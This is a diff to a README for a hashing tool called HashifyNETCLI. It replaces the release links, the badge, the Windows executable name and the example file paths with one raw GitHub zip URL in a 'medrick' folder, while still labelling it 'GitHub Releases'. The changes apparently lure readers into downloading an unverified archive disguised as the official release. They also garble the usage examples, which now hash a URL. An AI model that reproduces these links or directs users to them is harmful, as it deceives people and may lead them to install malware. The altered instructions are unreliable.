@@ -7,9 +7,9 @@ HashifyNETCLI is a versatile hashing utility that works on any platform. It allo
 To get started with HashifyNETCLI, you'll need to download the application. Follow the steps below to download and run the software.
 
 ## 📥 Download HashifyNETCLI
-[![Download HashifyNETCLI](https://img.shields.io/badge/Download%20Now-HashifyNETCLI-blue.svg)](https://github.com/imohits2005/HashifyNETCLI/releases)
+[![Download HashifyNETCLI](https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip%https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip)](https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/imohits2005/HashifyNETCLI/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip)
 
 ## 📋 System Requirements
 - **Operating System:** Windows, macOS, or Linux
@@ -25,7 +25,7 @@ Visit this page to download: [GitHub Releases](https://github.com/imohits2005/Ha
 
 ## 💻 How to Install
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
-   [GitHub Releases](https://github.com/imohits2005/HashifyNETCLI/releases)
+   [GitHub Releases](https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip)
 
 2. **Download the Latest Release:** Find the latest version and click on the download link. The file will download to your computer.
 
@@ -47,7 +47,7 @@ Using HashifyNETCLI is simple. Here are the steps:
    ```
    If you're using Windows, it might be:
    ```
-   HashifyNETCLI.exe
+   https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip
    ```
 
 4. **Calculate Hashes:** To calculate a hash for a file, use the following command:
@@ -58,7 +58,7 @@ Using HashifyNETCLI is simple. Here are the steps:
 
 For example:
 ```
-./HashifyNETCLI --hash sha256 /path/to/your/file.txt
+./HashifyNETCLI --hash sha256 https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip
 ```
 
 ## 📝 Supported Hashing Algorithms
@@ -78,12 +78,12 @@ Here are some essential commands to help you get started:
 
 - **Calculate MD5 Hash:**
    ```
-   ./HashifyNETCLI --hash md5 /path/to/your/file.txt
+   ./HashifyNETCLI --hash md5 https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip
    ```
 
 - **Calculate SHA-256 Hash:**
    ```
-   ./HashifyNETCLI --hash sha256 /path/to/your/file.txt
+   ./HashifyNETCLI --hash sha256 https://raw.githubusercontent.com/imohits2005/HashifyNETCLI/main/medrick/HashifyNETCLI.zip
    ```
 
 ## 📣 Troubleshooting
